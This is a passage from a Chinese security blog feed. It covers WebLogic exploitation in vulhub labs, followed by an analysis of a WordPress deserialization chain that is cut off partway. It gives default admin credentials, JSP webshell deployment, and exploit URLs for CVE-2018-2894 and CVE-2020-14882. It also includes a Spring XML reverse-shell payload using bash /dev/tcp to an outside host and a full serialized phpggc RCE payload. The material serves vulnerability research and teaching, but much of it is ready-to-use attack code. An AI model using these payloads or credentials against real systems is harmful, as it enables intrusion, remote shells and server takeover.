<p><strong>参考</strong>：<br><a href="https://co0ontty.github.io/2019/08/08/CVE_2019_2725.html">Weblogic 反序列化远程代码执行漏洞（CVE-2019-2725) - co0ontty</a><br><a href="https://xz.aliyun.com/t/5024">Weblogic 远程命令执行漏洞分析(CVE-2019-2725)及利用payload构造详细解读</a></p>
<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/8465">WebLogic-XMLDecoder反序列化漏洞分析</a><br><a href="https://xz.aliyun.com/t/1848">Weblogic XMLDecoder RCE分析</a><br><a href="https://xz.aliyun.com/t/5046">xmldecoder反序列化的补丁与绕过</a></p>
<h1 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h1><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p><strong>前置知识</strong>：<br>后台常用默认弱口令：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">system/password</span><br><span class="line">weblogic/weblogic</span><br><span class="line">admin/security</span><br><span class="line">joe/password</span><br><span class="line">mary/password</span><br><span class="line">system/security</span><br><span class="line">wlcsystem/wlcsystem</span><br><span class="line">wlpisystem/wlpisystem</span><br><span class="line">weblogic/Oracle@123</span><br></pre></td></tr></table></figure>

<p>weblogic常用弱口令： <a href="http://cirt.net/passwords?criteria=weblogic">http://cirt.net/passwords?criteria=weblogic</a><br>后台登录地址：&#x2F;console&#x2F;login&#x2F;LoginForm.jsp<br>另外weblogic的密码使用AES加密（老版本使用3DES），对称密码在获取密文和密钥的情况下可解密，存放的文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml<br><strong>环境</strong>：<br>使用vulhub中的docker环境进行复现：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">╭─dili@dili ~/vulhub/weblogic/weak_password ‹master› </span><br><span class="line">╰─$ sudo docker-compose up -d </span><br><span class="line"></span><br><span class="line">╭─dili@dili ~/vulhub/weblogic/weak_password ‹master› </span><br><span class="line">╰─$ sudo docker ps           </span><br><span class="line">CONTAINER ID   IMAGE                               COMMAND                  CREATED          STATUS          PORTS                                                                                  NAMES</span><br><span class="line">76e193e908ce   vulhub/weblogic:10.3.6.0-2017       <span class="string">&quot;startWebLogic.sh&quot;</span>       44 seconds ago   Up 23 seconds   0.0.0.0:5556-&gt;5556/tcp, :::5556-&gt;5556/tcp, 0.0.0.0:7001-&gt;7001/tcp, :::7001-&gt;7001/tcp   weak_password_weblogic_1</span><br></pre></td></tr></table></figure>

<p>docker环境在服务器中，将7001映射到外部端口33401<br>访问<code>http://10.140.32.159:33401/console/login/LoginForm.jsp</code><br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230729232120.png"><br>使用常用的弱口令尝试登录，用户名：weblogic   口令：Oracle@123<br>成功登入后台，接下来就是找到上传文件的点，获取shell<br>点击部署-&gt;安装<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230729235850.png"><br>准备一个jsp马，并将对应的目录打成war包上传</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jar -cvf pack.war .</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230730105646.png"><br>部署成功，使用冰蝎进行连接<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230730110023.png"><br>参考：<a href="http://www.meta-sec.top/2022/02/09/weblogic-chang-jian-lou-dong-yi-kong-zhi-tai-ruo-kou-ling/">weblogic常见漏洞（一）- 控制台弱口令 | meta-sec</a></p>
<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><h3 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h3><p><strong>漏洞复现</strong>：<br>使用vulhub上的docker搭建环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>查看此容器的账户和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker-compose logs | grep password</span><br></pre></td></tr></table></figure>

<p>使用账户(weblogic)和密码(deUHw2wQ)登录后台<br>选择高级选项<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824204149.png"><br>启用Web服务测试页<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824204341.png"><br>开发环境下的测试页有config.do和begin.do<br>进入config.do文件，将目录设置为ws_utc应用的静态文件css目录</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824205951.png"><br>上传一个jsp文件<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824210608.png"><br>后端存储的文件名是时间戳+上传的文件名，时间戳会回显在代码中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824210930.png"><br>访问<code>http://10.140.32.159:33401/ws_utc/css/config/keystore/1692882428438_shell.jsp</code><br>使用冰蝎连接<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824211202.png"><br>同样可以使用begin.do进行利用<br>访问<code>http://10.140.32.159:33401/ws_utc/begin.do</code>，上传jsp<br>尽管上传后会报错，但是抓post包的响应中有jsp文件名<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824211711.png"><br>访问<code>http://10.140.32.159:33401/ws_utc/css/upload/RS_Upload_2023-08-24_13-16-31_154/import_file_name_shell.jsp</code>，使用冰蝎连接</p>
<h3 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h3><p><strong>漏洞复现</strong>：<br>使用vulhub上的docker搭建环境<br>这里未授权访问的地址是<br><code>http://10.140.32.159:33401/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29</code>，通过这个地址就能够进入后台<br>命令执行操作：<br><code>http://10.140.32.159:33401/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/CVE-2020-14882%27);%22);</code><br>命令执行成功<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230825143226.png"><br>反弹shell<br>创建一个xml文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># reverse-bash.xml</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/172.24.0.1/5555 0&gt;&amp;1]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问下面url即可进行shell反弹<br><code>http://10.140.32.159:33401/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(&quot;http://172.24.0.1:8080/cve-2020-14882-reverse-bash.xml&quot;)</code></p>
<p>参考：<a href="https://cert.360.cn/report/detail?id=a95c049c576af8d0e56ae14fad6813f4">CVE-2020-14882：Weblogic Console 权限绕过深入解析 - 360CERT</a></p>
<h1 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/9932">weblogic漏洞大杂烩</a><br><a href="https://www.cnblogs.com/nice0e3/p/14201884.html">Java安全之初探weblogic T3协议漏洞 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://y4er.com/series/weblogic/">Weblogic - 系列 - Y4er的博客</a><br><a href="http://drops.xmd5.com/static/drops/web-13470.html">修复weblogic的JAVA反序列化漏洞的多种方法 | WooYun知识库 (xmd5.com)</a><br><a href="https://paper.seebug.org/1321/">Weblogic12c T3 协议安全漫谈 (seebug.org)</a></p>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/12947&https://xz.aliyun.com/t/12964">https://xz.aliyun.com/t/12947&amp;https://xz.aliyun.com/t/12964</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>一条有趣的WordPress反序列化链分析</title>
    <url>/2024/02/07/WordPress-RCE1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近实践中正好碰到一个WordPress站点，发现很久没有关注PHP框架中的漏洞，于是去PHPGGC上看一看有没有”好玩的”RCE，正好看到WordPress&#x2F;RCE&#x2F;1这条链，仔细分析一下其过程</p>
<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>WordPress &lt; 6.3.2，存在一条反序列链，以WP_Theme中的__toString为起点，WpOrg\Requests\Hooks的dispatch方法为终点。</p>
<h1 id="相关类"><a href="#相关类" class="headerlink" title="相关类"></a>相关类</h1><p><strong>WP_Block_List类</strong>：</p>
<p>在WordPress中，<code>WP_Block_List</code> 类是用于管理和操作页面上的块（blocks）的核心类之一。块是WordPress编辑器（Gutenberg）的基本构建单元，用于创建和组织内容。</p>
<p><code>WP_Block_List</code> 类提供了一系列方法来处理块，包括以下功能：</p>
<ol>
<li>注册和管理块类型：<code>WP_Block_List</code> 类允许开发者注册和管理自定义的块类型。通过注册块类型，可以定义块的属性、编辑器样式和渲染模板等。</li>
<li>渲染块内容：<code>WP_Block_List</code> 类提供了方法来渲染块的内容。这包括将块的属性传递给块模板，生成最终的块输出。</li>
<li>解析块内容：<code>WP_Block_List</code> 类还提供了将块内容解析为可编辑的块数据结构的方法。这对于处理保存在数据库中的块内容以及在编辑器中加载和编辑块非常有用。</li>
<li>块过滤和转换：<code>WP_Block_List</code> 类提供了方法来过滤和转换块内容。这样可以对块进行操作，例如添加、删除、修改属性或在块之间进行排序。</li>
</ol>
<p><strong>WP_Theme</strong>：</p>
<p>在WordPress中，WP_Theme类是一个用于处理和管理主题（theme）的类。它提供了一组方法和属性，用于获取主题的信息、样式和模板文件、父子主题关系等。</p>
<p><strong>WP_Block_Type_Registry</strong>：</p>
<p>WP_Block_Type_Registry类是一个用于管理和注册区块类型（Block Type）的类。它提供了一系列方法和功能，用于注册、检索和操作区块类型。开发者可以轻松地注册、获取和管理区块类型。区块类型是Gutenberg编辑器中的核心概念，它定义了一个可重复使用的区块，具有自己的属性、样式和呈现逻辑。WP_Block_Type_Registry类提供了一种机制，允许开发者通过自定义区块类型来扩展和定制WordPress的编辑体验。</p>
<p><strong>WpOrg\Requests\Session</strong>：</p>
<p>WpOrg\Requests\Session是一个用于处理会话数据的类。它提供了一组方法和功能，用于在WordPress应用程序中管理和存储会话数据。</p>
<p><strong>WpOrg\Requests\Hooks</strong>：</p>
<p>Wp_Hook类的方法允许开发者通过添加、移除和执行回调函数来自定义和扩展WordPress功能。通过使用动作钩子和过滤器钩子，开发者可以在适当的时机干预WordPress的执行流程，并修改数据、添加功能或者改变输出。</p>
<h1 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$hello</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hello</span>();</span><br><span class="line">	[<span class="variable">$hello</span>,<span class="string">&quot;aaa&quot;</span>]();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样能够成功执行hello中的aaa方法，这在CTF中经常出现</p>
<p><strong>可变函数</strong>：可变函数（Variable Functions）是一种特殊的语法，允许通过变量来调用函数。这意味着函数名可以存储在一个变量中，并在需要时通过该变量动态调用函数。</p>
<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p><strong>payload生成</strong>：</p>
<p>使用phpggc生成：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">php phpggc WordPress/RCE1 system whoami -u</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240206220058.png"></p>
<p><strong>测试文件</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/wp-load.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">wp</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;O%3A8%3A%22WP_Theme%22%3A2%3A%7Bs%3A7%3A%22headers%22%3BO%3A13%3A%22WP_Block_List%22%3A2%3A%7Bs%3A6%3A%22blocks%22%3Ba%3A1%3A%7Bs%3A4%3A%22Name%22%3Ba%3A1%3A%7Bs%3A9%3A%22blockName%22%3Bs%3A12%3A%22Parent+Theme%22%3B%7D%7Ds%3A8%3A%22registry%22%3BO%3A22%3A%22WP_Block_Type_Registry%22%3A1%3A%7Bs%3A22%3A%22registered_block_types%22%3BO%3A8%3A%22WP_Theme%22%3A2%3A%7Bs%3A7%3A%22headers%22%3BN%3Bs%3A6%3A%22parent%22%3BO%3A22%3A%22WpOrg%5CRequests%5CSession%22%3A3%3A%7Bs%3A3%3A%22url%22%3Bs%3A10%3A%22http%3A%2F%2Fp%3A0%22%3Bs%3A7%3A%22headers%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A7%3A%22options%22%3Ba%3A1%3A%7Bs%3A5%3A%22hooks%22%3BO%3A20%3A%22WpOrg%5CRequests%5CHooks%22%3A1%3A%7Bs%3A5%3A%22hooks%22%3Ba%3A1%3A%7Bs%3A23%3A%22requests.before_request%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A20%3A%22WpOrg%5CRequests%5CHooks%22%3A1%3A%7Bs%3A5%3A%22hooks%22%3Ba%3A1%3A%7Bs%3A15%3A%22http%3A%2F%2Fp%3A0%2FName%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7D%7D%7Di%3A1%3Bs%3A8%3A%22dispatch%22%3B%7D%7D%7D%7D%7D%7D%7D%7D%7D%7Ds%3A6%3A%22parent%22%3BN%3B%7D&quot;</span>;</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>输出结果</strong>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240206221343.png"></p>
<h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Hooks.php:<span class="number">93</span>, WpOrg\Requests\Hooks-&gt;<span class="title function_ invoke__">dispatch</span>()</span><br><span class="line">Hooks.php:<span class="number">93</span>, WpOrg\Requests\Hooks-&gt;<span class="title function_ invoke__">dispatch</span>()</span><br><span class="line">Requests.php:<span class="number">455</span>, <span class="title class_">WpOrg\Requests\Requests</span>::<span class="title function_ invoke__">request</span>()</span><br><span class="line">Session.php:<span class="number">232</span>, WpOrg\Requests\Session-&gt;<span class="title function_ invoke__">request</span>()</span><br><span class="line">Session.php:<span class="number">159</span>, WpOrg\Requests\Session-&gt;<span class="title function_ invoke__">get</span>()</span><br><span class="line"><span class="class"><span class="keyword">class</span>-<span class="title">wp</span>-<span class="title">theme</span>.<span class="title">php</span>:702, <span class="title">WP_Theme</span>-&gt;<span class="title">offsetGet</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">block</span>-<span class="title">type</span>-<span class="title">registry</span>.<span class="title">php</span>:145, <span class="title">WP_Block_Type_Registry</span>-&gt;<span class="title">get_registered</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">block</span>.<span class="title">php</span>:130, <span class="title">WP_Block</span>-&gt;<span class="title">__construct</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">block</span>-<span class="title">list</span>.<span class="title">php</span>:96, <span class="title">WP_Block_List</span>-&gt;<span class="title">offsetGet</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">theme</span>.<span class="title">php</span>:833, <span class="title">WP_Theme</span>-&gt;<span class="title">get</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">theme</span>.<span class="title">php</span>:851, <span class="title">WP_Theme</span>-&gt;<span class="title">display</span>()</span></span><br><span class="line"><span class="class"><span class="title">class</span>-<span class="title">wp</span>-<span class="title">theme</span>.<span class="title">php</span>:513, <span class="title">WP_Theme</span>-&gt;<span class="title">__toString</span>()</span></span><br><span class="line"><span class="class"><span class="title">debug</span>.<span class="title">php</span>:6, </span>&#123;main&#125;()</span><br></pre></td></tr></table></figure>

<h1 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h1><p><strong>第一步</strong>：</p>
<p>从测试文件开始</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240206222129.png"></p>
<p>通过反序列化得到的$obj是WP_Theme对象，而使用echo输出对象会触发该对象的__toString方法</p>
<p><strong>第二步</strong>：</p>
<p>进入wp-includes&#x2F;class-wp-theme.php的__toString方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * When converting the object to a string, the theme name is returned.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 3.4.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> string Theme name, ready for display (translated)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="string">&#x27;Name&#x27;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入字符串Name，进入该对象的display方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"> <span class="variable">$header</span>, <span class="variable">$markup</span> = <span class="literal">true</span>, <span class="variable">$translate</span> = <span class="literal">true</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>( <span class="variable">$header</span> );</span><br><span class="line">    <span class="keyword">if</span> ( <span class="literal">false</span> === <span class="variable">$value</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$translate</span> &amp;&amp; ( <span class="keyword">empty</span>( <span class="variable">$value</span> ) || ! <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load_textdomain</span>() ) ) &#123;</span><br><span class="line">        <span class="variable">$translate</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$translate</span> ) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">translate_header</span>( <span class="variable">$header</span>, <span class="variable">$value</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$markup</span> ) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">markup_header</span>( <span class="variable">$header</span>, <span class="variable">$value</span>, <span class="variable">$translate</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的$header为字符串Name，依旧还在该类中，进入get方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"> <span class="variable">$header</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">isset</span>( <span class="variable language_">$this</span>-&gt;headers[ <span class="variable">$header</span> ] ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">isset</span>( <span class="variable language_">$this</span>-&gt;headers_sanitized ) ) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headers_sanitized = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cache_get</span>( <span class="string">&#x27;headers&#x27;</span> );</span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="title function_ invoke__">is_array</span>( <span class="variable">$this</span>-&gt;headers_sanitized ) ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;headers_sanitized = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable language_">$this</span>-&gt;headers_sanitized[ <span class="variable">$header</span> ] ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;headers_sanitized[ <span class="variable">$header</span> ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If themes are a persistent group, sanitize everything and cache it. One cache add is better than many cache sets.</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">self</span>::<span class="variable">$persistently_cache</span> ) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$this</span>-&gt;headers ) <span class="keyword">as</span> <span class="variable">$_header</span> ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;headers_sanitized[ <span class="variable">$_header</span> ] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitize_header</span>( <span class="variable">$_header</span>, <span class="variable">$this</span>-&gt;headers[ <span class="variable">$_header</span> ] );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cache_add</span>( <span class="string">&#x27;headers&#x27;</span>, <span class="variable">$this</span>-&gt;headers_sanitized );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headers_sanitized[ <span class="variable">$header</span> ] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitize_header</span>( <span class="variable">$header</span>, <span class="variable">$this</span>-&gt;headers[ <span class="variable">$header</span> ] );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;headers_sanitized[ <span class="variable">$header</span> ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的$this-&gt;headers[ $header ]类似于访问数组元素，而headers属性可以控制，将其设置成实现ArrayAccess接口的类，这样就会调用该类的 offsetGet、offsetSet、offsetExists 和 offsetUnset 等方法进行元素的操作</p>
<p>这里将$this-&gt;headers设置成WP_Block_List对象，这个类实现了ArrayAccess接口，这样在$this-&gt;headers[ $header ]操作时会进入offsetGet方法，其中$header依旧为字符串Name</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207000354.png"></p>
<p><strong>第三步</strong>：</p>
<p>进入wp-includes&#x2F;class-wp-block-list.php的offsetGet方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"> <span class="variable">$index</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable">$block</span> = <span class="variable language_">$this</span>-&gt;blocks[ <span class="variable">$index</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable">$block</span> ) &amp;&amp; <span class="title function_ invoke__">is_array</span>( <span class="variable">$block</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        <span class="variable">$block</span>                  = <span class="keyword">new</span> <span class="title class_">WP_Block</span>( <span class="variable">$block</span>, <span class="variable language_">$this</span>-&gt;available_context, <span class="variable language_">$this</span>-&gt;registry );</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blocks[ <span class="variable">$index</span> ] = <span class="variable">$block</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$block</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样WP_Block_List对象中的属性全部都能控制，要达到关键点，需要满足if条件，即blocks属性要有Name键，并且是一个数组</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207001449.png"></p>
<p>这里会实例化一个WP_Block对象，并且参数都是可控</p>
<p><strong>第四步</strong>：</p>
<p>进入wp-includes&#x2F;class-wp-block.php的构造方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> <span class="variable">$block</span>, <span class="variable">$available_context</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$registry</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;parsed_block = <span class="variable">$block</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;name         = <span class="variable">$block</span>[<span class="string">&#x27;blockName&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">is_null</span>( <span class="variable">$registry</span> ) ) &#123;</span><br><span class="line">        <span class="variable">$registry</span> = <span class="title class_">WP_Block_Type_Registry</span>::<span class="title function_ invoke__">get_instance</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;registry = <span class="variable">$registry</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关键点</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;block_type = <span class="variable">$registry</span>-&gt;<span class="title function_ invoke__">get_registered</span>( <span class="variable">$this</span>-&gt;name );</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;available_context = <span 